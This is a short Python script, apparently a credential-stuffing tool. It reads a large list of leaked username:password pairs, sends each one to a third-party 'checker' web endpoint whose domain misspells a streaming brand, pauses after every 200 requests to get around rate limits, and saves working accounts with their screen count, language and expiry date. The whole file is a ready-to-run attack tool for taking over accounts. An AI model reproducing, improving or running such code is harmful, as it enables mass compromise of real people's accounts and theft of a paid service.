import requests, time, tqdm

in_filename = "D:\Desktop\\352k.txt"
out_filename = "D:\Desktop\\risultati.txt"
url = "https://checker.neftlix.ml/check-account"


def main():
    parsed = 0
    discarded = 0
    count = 0
    fileout = open(out_filename, "w")

    try:
        filein = open(in_filename)
        rows = filein.readlines()
        key = input("rows found: {0}\n"
                    "expected time: {1}min\n"
                    "continue? Y/N: ".format(len(rows), (len(rows) / 200)))
        key = key.lower()

        if key == "n" or not key == "y":
            exit(0)

        for line in tqdm.tqdm(rows, total=len(rows), unit="account"):

            if line.count("@") == 2 or line.count(":") > 1:
                discarded += 1
                continue
            if count > 199:
                count = 0
                print("line {0} reached, count is {1}. Time to go bed!".format(rows, count))
                time.sleep(60)

            username, password = line.split(":")
            username_lowercase = username.lower()

            try:
                answer = requests.post(url, data={'account': line})
                data = answer.json()
            except ConnectionError:
                print("status code: {0}\nreason: {1}".format(answer.status_code, answer.reason))
                exit(0)

            if data['working']:
                fileout.write("username: {4}\tpass: {5}\tsuccess: {0}\tscreens: {1}\tlanguage: {2}\tworking: {3}\tuntil: {6}".format(data['success'], data['screens'],
                                                                                     data['language'], data['working'], username_lowercase, password, data['until']))

            parsed += 1
            count += 1

        print("rows parsed: " + str(parsed) + "\n" + "rows discarded: " + str(discarded))
        fileout.close()

    except IOError:
        print("file not found!")
        exit(0)


if __name__ == '__main__':
    main()
